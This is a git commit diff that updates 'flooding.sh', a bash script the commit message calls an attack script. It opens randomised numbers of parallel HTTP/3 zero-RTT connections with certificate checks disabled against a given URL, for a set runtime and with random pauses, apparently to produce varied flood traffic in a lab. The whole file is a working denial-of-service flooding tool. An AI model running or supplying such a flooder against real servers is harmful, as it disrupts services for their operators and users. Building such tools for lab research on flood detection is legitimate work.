9e24258b663aa234628821a95dd7f7d02b9f81d2
philippm01 <philippmuro@gmail.com>
2025-01-13 09:30:30 +0100

    updated attack sricpts for more variance

--- flooding.sh
+++ flooding.sh
@@ -1,12 +1,38 @@
-concurrent_connections=$1
-iterations=$2
-url=$3 # e.g https://192.168.0.103:4000/index.html
+#!/bin/bash
 
-trap "echo 'interput'; exit" SIGINT
+trap "kill 0" SIGINT
 
-for i in $(seq 1 $iterations)
-do
-   echo "Iteration $i"
-   sudo seq 1 $concurrent_connections | xargs -n1 -P$concurrent_connections python3 examples/http3_client.py --zero-rtt --insecure $url
+if [ "$#" -ne 6 ]; then
+    echo "Usage: $0 <min_concurrent_connections> <max_concurrent_connections> <runtime_in_seconds> <min_loop_pause_seconds> <max_loop_pause_seconds> <url>"
+    exit 1
+fi
+
+MIN_CONCURRENT_CONNECTIONS=$1
+MAX_CONCURRENT_CONNECTIONS=$2
+RUNTIME=$3
+MIN_SLEEP_INTERVAL=$4
+MAX_SLEEP_INTERVAL=$5
+URL=$6
+
+START_TIME=$(date +%s)
+
+while true; do
+
+    CONCURRENT_CONNECTIONS=$((RANDOM % (MAX_CONCURRENT_CONNECTIONS - MIN_CONCURRENT_CONNECTIONS + 1) + MIN_CONCURRENT_CONNECTIONS))
+    SLEEP_INTERVAL=$((RANDOM % (MAX_SLEEP_INTERVAL - MIN_SLEEP_INTERVAL + 1) + MIN_SLEEP_INTERVAL))
+
+    CURRENT_TIME=$(date +%s)
+    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
+    REMAINING_TIME=$((RUNTIME - ELAPSED_TIME))
+
+    if [ "$REMAINING_TIME" -le 0 ]; then
+        echo "Finished"
+        exit 0
+    fi
+
+    seq 1 "$CONCURRENT_CONNECTIONS" | xargs -n1 -P"$CONCURRENT_CONNECTIONS" bash -c \
+        "timeout $REMAINING_TIME python3 examples/http3_client.py --zero-rtt --insecure $URL > /dev/null 2>&1 &"
+
+    sleep "$SLEEP_INTERVAL"
 done
 
